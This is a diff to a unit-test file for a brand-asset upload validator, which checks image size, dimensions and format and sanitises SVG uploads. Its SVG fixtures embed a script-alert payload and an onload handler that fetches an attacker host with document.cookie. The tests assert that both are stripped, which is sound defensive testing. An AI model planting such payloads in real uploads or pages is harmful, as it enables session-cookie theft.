@@ -1,17 +1,34 @@
 import { ACTION_OUTCOME } from '@blog/config';
+import { faker } from '@faker-js/faker';
 import { SITE_CONFIG_LOG } from '@platform/constants/site-config';
 import { UPLOAD_REFUSAL } from '@platform/constants/upload';
-import { MAX_UPLOAD_BYTES } from '@platform/utils/brand-asset-limits/brand-asset-limits';
+import { MOCK_SVG_CIRCLE } from '@platform/testing/site-config/fixtures';
+import { MOCK_MIME_TYPE } from '@platform/testing/upload/fixtures';
+import {
+  brandAssetKindSchema,
+  DIMENSION_BOUNDS_PX,
+  MAX_UPLOAD_BYTES,
+} from '@platform/utils/brand-asset-limits/brand-asset-limits';
 import { logger } from '@platform/utils/logger/logger';
 
 import { sanitizeSvgMarkup } from './sanitize-svg-markup';
 import { validateBrandAssetUpload } from './validate-brand-asset';
 
+faker.seed(5998);
+
 vi.mock('./sanitize-svg-markup', { spy: true });
 
-const PNG_TYPE = 'image/png';
-const SVG_TYPE = 'image/svg+xml';
-const PNG_FILENAME = 'upload.png';
+const SVG_NAMESPACE = 'http://www.w3.org/2000/svg';
+const MOCK_PNG_FILENAME = faker.system.commonFileName('png');
+const MOCK_SVG_FILENAME = faker.system.commonFileName('svg');
+const MOCK_SCRIPT_PAYLOAD = `alert(${faker.lorem.word()})`;
+const MOCK_ATTACKER_HOST = faker.internet.domainName();
+const MOCK_SANITISER_ERROR_MESSAGE = faker.lorem.words(3);
+const MOCK_SQUARE_SIZE = faker.number.int({ min: 64, max: 256 });
+const MOCK_WIDE_WIDTH = 300;
+const MOCK_WIDE_HEIGHT = 80;
+const BELOW_MIN_SIZE =
+  DIMENSION_BOUNDS_PX[brandAssetKindSchema.enum.logo].min - 1;
 
 const buildPngBuffer = (width: number, height: number): Buffer => {
   const buffer = Buffer.alloc(33);
@@ -25,224 +42,194 @@ const buildPngBuffer = (width: number, height: number): Buffer => {
   return buffer;
 };
 
-const pngFile = (width: number, height: number, sizeOverrideBytes?: number) => {
-  const bytes = buildPngBuffer(width, height);
-  const padded = sizeOverrideBytes
-    ? Buffer.concat([bytes, Buffer.alloc(sizeOverrideBytes)])
-    : bytes;
-  return new File([new Uint8Array(padded)], PNG_FILENAME, {
-    type: PNG_TYPE,
+const mockPngFile = (width: number, height: number, paddingBytes = 0) => {
+  const bytes = Buffer.concat([
+    buildPngBuffer(width, height),
+    Buffer.alloc(paddingBytes),
+  ]);
+  return new File([new Uint8Array(bytes)], MOCK_PNG_FILENAME, {
+    type: MOCK_MIME_TYPE.PNG,
   });
 };
 
-const svgFile = (markup: string, filename = 'upload.svg') => {
-  return new File([markup], filename, { type: SVG_TYPE });
+const mockGifFile = () => {
+  const gifBuffer = Buffer.alloc(10);
+  gifBuffer.write('GIF89a', 0, 'latin1');
+  gifBuffer.writeUInt16LE(MOCK_SQUARE_SIZE, 6);
+  gifBuffer.writeUInt16LE(MOCK_SQUARE_SIZE, 8);
+  return new File(
+    [new Uint8Array(gifBuffer)],
+    faker.system.commonFileName('gif'),
+    {
+      type: MOCK_MIME_TYPE.GIF,
+    },
+  );
 };
+
+const mockSvgFile = (markup: string) =>
+  new File([markup], MOCK_SVG_FILENAME, { type: MOCK_MIME_TYPE.SVG });
+
+const svg = (attributes: string, inner = '') =>
+  `<svg xmlns="${SVG_NAMESPACE}"${attributes}>${inner}</svg>`;
+
+const viewBox = (width: number, height: number) =>
+  ` viewBox="0 0 ${width} ${height}"`;
+
+const refused = (reason: string, values?: Record<string, unknown>) => ({
+  ok: false,
+  error: { outcome: ACTION_OUTCOME.REFUSED, reason, ...(values && { values }) },
+});
 
 describe(validateBrandAssetUpload, () => {
-  it('accepts a square PNG for the favicon', async () => {
-    const result = await validateBrandAssetUpload(pngFile(64, 64), 'favicon');
+  it.each([
+    {
+      scenario: 'a square PNG favicon',
+      file: mockPngFile(MOCK_SQUARE_SIZE, MOCK_SQUARE_SIZE),
+      kind: brandAssetKindSchema.enum.favicon,
+      contentType: MOCK_MIME_TYPE.PNG,
+      extension: 'png',
+    },
+    {
+      scenario: 'a non-square PNG logo',
+      file: mockPngFile(MOCK_WIDE_WIDTH, MOCK_WIDE_HEIGHT),
+      kind: brandAssetKindSchema.enum.logo,
+      contentType: MOCK_MIME_TYPE.PNG,
+      extension: 'png',
+    },
+    {
+      scenario: 'a clean square SVG favicon',
+      file: mockSvgFile(svg(viewBox(24, 24), MOCK_SVG_CIRCLE)),
+      kind: brandAssetKindSchema.enum.favicon,
+      contentType: MOCK_MIME_TYPE.SVG,
+      extension: 'svg',
+    },
+    {
+      scenario: 'a non-square SVG logo',
+      file: mockSvgFile(svg(viewBox(MOCK_WIDE_WIDTH, MOCK_WIDE_HEIGHT))),
+      kind: brandAssetKindSchema.enum.logo,
+      contentType: MOCK_MIME_TYPE.SVG,
+      extension: 'svg',
+    },
+  ])('accepts $scenario', async ({ file, kind, contentType, extension }) => {
+    const result = await validateBrandAssetUpload(file, kind);
 
-    expect(result).toEqual({
-      ok: true,
-      data: {
-        buffer: expect.any(Buffer),
-        contentType: PNG_TYPE,
-        extension: 'png',
-      },
-    });
-  });
-
-  it('accepts a non-square PNG for the logo', async () => {
-    const result = await validateBrandAssetUpload(pngFile(300, 80), 'logo');
-
+    const data = result.ok ? result.data : undefined;
     expect(result.ok).toBe(true);
+    expect(data?.buffer).toBeInstanceOf(Buffer);
+    expect(data?.contentType).toBe(contentType);
+    expect(data?.extension).toBe(extension);
   });
 
-  it('rejects a non-square favicon with a reason naming the actual dimensions', async () => {
-    const result = await validateBrandAssetUpload(pngFile(64, 40), 'favicon');
+  it.each([
+    {
+      scenario: 'a non-square favicon naming the actual dimensions',
+      file: mockPngFile(MOCK_SQUARE_SIZE, MOCK_SQUARE_SIZE - 1),
+      kind: brandAssetKindSchema.enum.favicon,
+      expected: refused(UPLOAD_REFUSAL.FAVICON_NOT_SQUARE, {
+        width: MOCK_SQUARE_SIZE,
+        height: MOCK_SQUARE_SIZE - 1,
+      }),
+    },
+    {
+      scenario: 'an empty file',
+      file: new File([], MOCK_PNG_FILENAME, { type: MOCK_MIME_TYPE.PNG }),
+      kind: brandAssetKindSchema.enum.logo,
+      expected: refused(UPLOAD_REFUSAL.FILE_MISSING),
+    },
+    {
+      scenario: 'a file over the size limit',
+      file: mockPngFile(
+        MOCK_SQUARE_SIZE,
+        MOCK_SQUARE_SIZE,
+        MAX_UPLOAD_BYTES[brandAssetKindSchema.enum.favicon],
+      ),
+      kind: brandAssetKindSchema.enum.favicon,
+      expected: refused(UPLOAD_REFUSAL.FILE_TOO_LARGE, { limit: '1.0 MB' }),
+    },
+    {
+      scenario: 'a readable format that is never let through',
+      file: mockGifFile(),
+      kind: brandAssetKindSchema.enum.logo,
+      expected: refused(UPLOAD_REFUSAL.BRAND_IMAGE_TYPE_UNSUPPORTED),
+    },
+    {
+      scenario: 'a non-square favicon SVG using its viewBox aspect ratio',
+      file: mockSvgFile(svg(viewBox(100, 40))),
+      kind: brandAssetKindSchema.enum.favicon,
+      expected: refused(UPLOAD_REFUSAL.SVG_FAVICON_NOT_SQUARE, {
+        width: 100,
+        height: 40,
+      }),
+    },
+    {
+      scenario: 'an SVG with no width, height or viewBox',
+      file: mockSvgFile(svg('')),
+      kind: brandAssetKindSchema.enum.favicon,
+      expected: refused(UPLOAD_REFUSAL.UNREADABLE_IMAGE),
+    },
+    {
+      scenario: 'unreadable bytes behind an image MIME type',
+      file: new File([faker.lorem.words(3)], MOCK_PNG_FILENAME, {
+        type: MOCK_MIME_TYPE.PNG,
+      }),
+      kind: brandAssetKindSchema.enum.logo,
+      expected: refused(UPLOAD_REFUSAL.UNREADABLE_IMAGE),
+    },
+    {
+      scenario: 'a logo below the minimum dimension',
+      file: mockPngFile(BELOW_MIN_SIZE, BELOW_MIN_SIZE),
+      kind: brandAssetKindSchema.enum.logo,
+      expected: refused(UPLOAD_REFUSAL.IMAGE_TOO_SMALL, {
+        size: DIMENSION_BOUNDS_PX[brandAssetKindSchema.enum.logo].min,
+      }),
+    },
+  ])('rejects $scenario', async ({ file, kind, expected }) => {
+    const result = await validateBrandAssetUpload(file, kind);
 
-    expect(result).toEqual({
-      ok: false,
-      error: {
-        outcome: ACTION_OUTCOME.REFUSED,
-        reason: UPLOAD_REFUSAL.FAVICON_NOT_SQUARE,
-        values: { width: 64, height: 40 },
-      },
-    });
+    expect(result).toEqual(expected);
   });
 
-  it('rejects an empty file', async () => {
-    const file = new File([], 'empty.png', { type: PNG_TYPE });
+  it.each([
+    {
+      scenario: 'an embedded script element',
+      markup: svg(
+        viewBox(24, 24),
+        `<script>${MOCK_SCRIPT_PAYLOAD}</script>${MOCK_SVG_CIRCLE}`,
+      ),
+      kind: brandAssetKindSchema.enum.logo,
+      removed: ['<script', MOCK_SCRIPT_PAYLOAD],
+    },
+    {
+      scenario: 'an onload event-handler attribute',
+      markup: svg(
+        `${viewBox(24, 24)} onload="fetch('https://${MOCK_ATTACKER_HOST}/'+document.cookie)"`,
+        MOCK_SVG_CIRCLE,
+      ),
+      kind: brandAssetKindSchema.enum.favicon,
+      removed: ['onload', MOCK_ATTACKER_HOST],
+    },
+  ])(
+    'sanitizes $scenario out of an SVG upload',
+    async ({ markup, kind, removed }) => {
+      const result = await validateBrandAssetUpload(mockSvgFile(markup), kind);
 
-    const result = await validateBrandAssetUpload(file, 'logo');
-
-    expect(result).toEqual({
-      ok: false,
-      error: {
-        outcome: ACTION_OUTCOME.REFUSED,
-        reason: UPLOAD_REFUSAL.FILE_MISSING,
-      },
-    });
-  });
-
-  it('rejects a file over the size limit before reading its bytes', async () => {
-    const file = pngFile(64, 64, MAX_UPLOAD_BYTES.favicon);
-
-    const result = await validateBrandAssetUpload(file, 'favicon');
-
-    expect(result).toEqual({
-      ok: false,
-      error: {
-        outcome: ACTION_OUTCOME.REFUSED,
-        reason: UPLOAD_REFUSAL.FILE_TOO_LARGE,
-        values: { limit: '1.0 MB' },
-      },
-    });
-  });
-
-  it('rejects a format it can read but never lets through, regardless of the declared MIME type', async () => {
-    const gifBuffer = Buffer.alloc(10);
-    gifBuffer.write('GIF89a', 0, 'latin1');
-    gifBuffer.writeUInt16LE(64, 6);
-    gifBuffer.writeUInt16LE(64, 8);
-    const file = new File([new Uint8Array(gifBuffer)], 'upload.gif', {
-      type: 'image/gif',
-    });
-
-    const result = await validateBrandAssetUpload(file, 'logo');
-
-    expect(result).toEqual({
-      ok: false,
-      error: {
-        outcome: ACTION_OUTCOME.REFUSED,
-        reason: UPLOAD_REFUSAL.BRAND_IMAGE_TYPE_UNSUPPORTED,
-      },
-    });
-  });
-
-  it('accepts a clean square SVG for the favicon', async () => {
-    const svg =
-      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/></svg>';
-
-    const result = await validateBrandAssetUpload(svgFile(svg), 'favicon');
-
-    expect(result).toEqual({
-      ok: true,
-      data: {
-        buffer: expect.any(Buffer),
-        contentType: SVG_TYPE,
-        extension: 'svg',
-      },
-    });
-  });
-
-  it('accepts a non-square SVG for the logo', async () => {
-    const svg =
-      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 300 80"><rect width="300" height="80"/></svg>';
-
-    const result = await validateBrandAssetUpload(svgFile(svg), 'logo');
-
-    expect(result.ok).toBe(true);
-  });
-
-  it('rejects a non-square favicon SVG using its viewBox aspect ratio', async () => {
-    const svg =
-      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 40"><rect width="100" height="40"/></svg>';
-
-    const result = await validateBrandAssetUpload(svgFile(svg), 'favicon');
-
-    expect(result).toEqual({
-      ok: false,
-      error: {
-        outcome: ACTION_OUTCOME.REFUSED,
-        reason: UPLOAD_REFUSAL.SVG_FAVICON_NOT_SQUARE,
-        values: { width: 100, height: 40 },
-      },
-    });
-  });
-
-  it('rejects an SVG that declares no width/height/viewBox to check squareness against', async () => {
-    const svg = '<svg xmlns="http://www.w3.org/2000/svg"></svg>';
-
-    const result = await validateBrandAssetUpload(svgFile(svg), 'favicon');
-
-    expect(result).toEqual({
-      ok: false,
-      error: {
-        outcome: ACTION_OUTCOME.REFUSED,
-        reason: UPLOAD_REFUSAL.UNREADABLE_IMAGE,
-      },
-    });
-  });
-
-  it('sanitizes an embedded <script> out of an SVG logo upload instead of passing it through', async () => {
-    const malicious =
-      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><script>alert(document.cookie)</script><circle cx="12" cy="12" r="10"/></svg>';
-
-    const result = await validateBrandAssetUpload(svgFile(malicious), 'logo');
-
-    expect(result.ok).toBe(true);
-    if (result.ok) {
-      const written = result.data.buffer.toString('utf-8');
-      expect(written).not.toContain('<script');
-      expect(written).not.toContain('alert(document.cookie)');
-    }
-  });
-
-  it('sanitizes an onload event-handler attribute out of an SVG favicon upload instead of passing it through', async () => {
-    const malicious =
-      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" onload="fetch(\'https://attacker.example/steal?c=\'+document.cookie)"><circle cx="12" cy="12" r="10"/></svg>';
-
-    const result = await validateBrandAssetUpload(
-      svgFile(malicious),
-      'favicon',
-    );
-
-    expect(result.ok).toBe(true);
-    if (result.ok) {
-      const written = result.data.buffer.toString('utf-8');
-      expect(written).not.toContain('onload');
-      expect(written).not.toContain('attacker.example');
-    }
-  });
-
-  it('rejects unreadable bytes even when the declared MIME type claims to be an image', async () => {
-    const file = new File(['not an image'], PNG_FILENAME, {
-      type: PNG_TYPE,
-    });
-
-    const result = await validateBrandAssetUpload(file, 'logo');
-
-    expect(result).toEqual({
-      ok: false,
-      error: {
-        outcome: ACTION_OUTCOME.REFUSED,
-        reason: UPLOAD_REFUSAL.UNREADABLE_IMAGE,
-      },
-    });
-  });
-
-  it('rejects a logo below the minimum dimension bound', async () => {
-    const result = await validateBrandAssetUpload(pngFile(8, 8), 'logo');
-
-    expect(result).toEqual({
-      ok: false,
-      error: {
-        outcome: ACTION_OUTCOME.REFUSED,
-        reason: UPLOAD_REFUSAL.IMAGE_TOO_SMALL,
-        values: { size: 32 },
-      },
-    });
-  });
+      const written = result.ok
+        ? result.data.buffer.toString('utf-8')
+        : undefined;
+      expect(result.ok).toBe(true);
+      for (const text of removed) {
+        expect(written).not.toContain(text);
+      }
+    },
+  );
 
   it('logs once and reports an upload failure when sanitising throws', async () => {
-    const cause = new Error('sanitiser unavailable');
+    const cause = new Error(MOCK_SANITISER_ERROR_MESSAGE);
     vi.mocked(sanitizeSvgMarkup).mockRejectedValueOnce(cause);
 
     const result = await validateBrandAssetUpload(
-      svgFile('<svg viewBox="0 0 24 24"></svg>'),
-      'logo',
+      mockSvgFile(svg(viewBox(24, 24))),
+      brandAssetKindSchema.enum.logo,
     );
 
     expect(result).toEqual({
@@ -252,10 +239,7 @@ describe(validateBrandAssetUpload, () => {
     expect(logger.error).toHaveBeenCalledOnce();
     expect(logger.error).toHaveBeenCalledWith(
       SITE_CONFIG_LOG.SVG_SANITIZE_FAILED,
-      {
-        kind: 'logo',
-        error: cause,
-      },
+      { kind: brandAssetKindSchema.enum.logo, error: cause },
     );
   });
 });
